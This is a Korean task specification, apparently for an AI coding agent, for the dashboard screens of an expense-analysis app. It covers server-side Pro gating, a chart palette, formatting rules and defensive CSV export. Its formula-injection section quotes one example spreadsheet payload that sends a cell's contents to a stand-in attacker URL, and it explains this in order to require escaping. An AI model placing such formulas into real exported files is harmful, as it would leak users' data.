## 작업

담당 화면: **S3**(빈 상태) · **S4**(Free 1개월) · **S5**(Free 2개월+) · **S6**(Pro).
전부 `/dashboard` 한 경로다. 데이터 상태와 플랜에 따라 다르게 렌더한다.

### S3 빈 상태 — 마찰 F1 대응. 이 제품 최대의 이탈 지점이다

로그인은 클릭 한 번이지만, 그다음 사용자는 카드사 사이트에 가서 명세서를 CSV로 받아 와야 한다. **여기서 막히면 뒤의 모든 기능이 무의미하다.**

업로드가 0건일 때:
- "명세서 CSV를 올리면 지출을 분석해 드립니다" + 업로드 CTA
- **카드사별 CSV 다운로드 경로 안내를 인라인으로** 표시한다. 주요 카드사(신한·KB국민·삼성·현대·롯데)와 은행(국민·신한·우리)의 "웹사이트 → 이용내역 조회 → 엑셀/CSV 다운로드" 경로를 텍스트로 적는다. 링크가 아니라 경로 설명이어야 한다 — 카드사 URL은 자주 바뀐다
- 접었다 펼 수 있게 하되 **기본은 펼친 상태**로 둔다

### S4/S5/S6 — 데이터가 있을 때

**Free (S4·S5)**
- 이번 달 총 지출 (KPI)
- 카테고리별 지출 (도넛 또는 가로 막대)
- 거래 목록 (카테고리 인라인 수정 가능)
- 미분류 거래는 회색으로 구분 표시

**Pro 전용 (S6)**
- 기간별 추이 (월별 카테고리 스택 또는 라인)
- 구독 누수 — 정기결제 목록 + 월 합계 + 금액 인상 플래그
- 이상거래 목록
- AI 요약 & 절약 인사이트 — 각 문장에 근거 거래 링크
- CSV 내보내기

**Pro 게이팅 — 서버에서 한다**

Free 사용자에게는 **집계 요약 한 줄만** 서버에서 계산해 전달한다:
> "당신의 데이터에서 정기결제 4건, 월 47,000원을 찾았습니다 — Pro에서 확인하세요"

이 수치는 진짜다(코드 계산이라 비용 0). 하지만 **상세 목록 배열은 응답 본문에 담지 않는다.** Server Component에서 플랜을 확인하고 Pro가 아니면 상세를 아예 조회하지 않거나 props로 내리지 않는다.

**CSS로 가리는 방식은 금지다.** DevTools Network로 응답 본문을 보면 데이터가 그대로 보인다.

### 차트

`dataviz` 스킬을 로드해 카테고리 12색 팔레트를 확정하고, **`src/lib/palette.ts`에 두어 전 차트가 그 파일만 참조**하게 한다. 컴포넌트마다 색을 정하면 차트끼리 색이 어긋난다.

차트 텍스트 색은 UI_GUIDE 토큰(`text-muted` 등)에서 가져와 라이트/다크 양쪽에서 읽히게 한다.

### CSV 내보내기 — 포뮬러 인젝션 방어

가맹점명은 사용자가 올린 파일에서 온 임의 문자열이다. `=HYPERLINK("http://공격자/"&A1)` 같은 셀은 Excel에서 **열자마자 실행된다.** 우리 앱이 아니라 사용자의 스프레드시트에서 터지는 취약점이다.

내보낼 때 `=`, `+`, `-`, `@`, 탭(`\t`), CR(`\r`)로 시작하는 셀은 **앞에 `'`를 붙인다.**

### 금액 표기

`font-mono tabular-nums`, `Intl.NumberFormat('ko-KR')`. 지출 금액 자체는 `text-text`, **증감분에만** `text-up`/`text-down`.

- **CSV 내보내기: `=`·`+`·`-`·`@`·탭·CR로 시작하는 셀에 `'`가 붙는가**
- Free 플랜일 때 Pro 상세 데이터가 컴포넌트 props에 없는가
- 업로드 0건일 때 빈 상태와 카드사 가이드가 렌더되는가
- 금액 포맷이 `₩1,234,567` 형태인가
- 미분류 거래가 구분 표시되는가

## 검증 절차

1. 위 AC 커맨드를 실행한다.
2. 아키텍처 체크리스트:
   - `dataviz` 스킬을 로드했고 팔레트가 `src/lib/palette.ts`에 있는가?
   - Pro 게이팅이 서버에서 일어나는가? 상세 데이터가 응답에 없는가?
   - UI_GUIDE 안티패턴을 하나도 쓰지 않았는가? (glass morphism, gradient text, 보라색, blur orb, 네온 글로우, 균일한 rounded-2xl)
   - 색을 하드코딩하지 않고 토큰(`bg-surface` 등)만 썼는가?
   - 집계를 여기서 다시 구현하지 않고 step 6의 함수를 쓰는가?
   - LLM 출력을 `dangerouslySetInnerHTML`로 렌더하지 않는가?
3. `phases/0-mvp/index.json`의 step 8을 업데이트한다.

**이 step이 가장 무겁다. 3회 시도 안에 안 끝나면 `error`로 기록하고 중단하라** — 차트/테이블 두 step으로 쪼개는 판단은 사람이 한다.

## 금지사항

- Pro 데이터를 클라이언트로 보내고 CSS로 가리지 마라. 이유: DevTools로 그대로 보인다. 게이팅이 아니라 눈속임이다.
- CSV 내보내기에서 셀 이스케이프를 빠뜨리지 마라. 이유: 사용자의 Excel에서 임의 코드가 실행된다.
- `dangerouslySetInnerHTML`을 쓰지 마라. 이유: AI 인사이트 문장에 사용자 CSV에서 온 문자열이 섞인다. React 기본 이스케이프가 유일한 방어선이다.
- 색을 hex로 하드코딩하지 마라. 이유: 다크 모드에서 깨진다. UI_GUIDE 토큰만 쓴다.
- UI_GUIDE 안티패턴 표의 항목을 쓰지 마라. 이유: 표에 이유가 적혀 있다.
- 집계를 여기서 다시 계산하지 마라. 이유: step 6이 단일 소스다.
- 스켈레톤 shimmer·숫자 카운트업·스크롤 리빌을 넣지 마라. 이유: UI_GUIDE 애니메이션 규칙에서 금지했다.
- 업로드 기능을 여기서 다시 만들지 마라. 이유: step 7이 담당한다. 빈 상태의 CTA는 `/dashboard/upload`로 보내기만 한다.
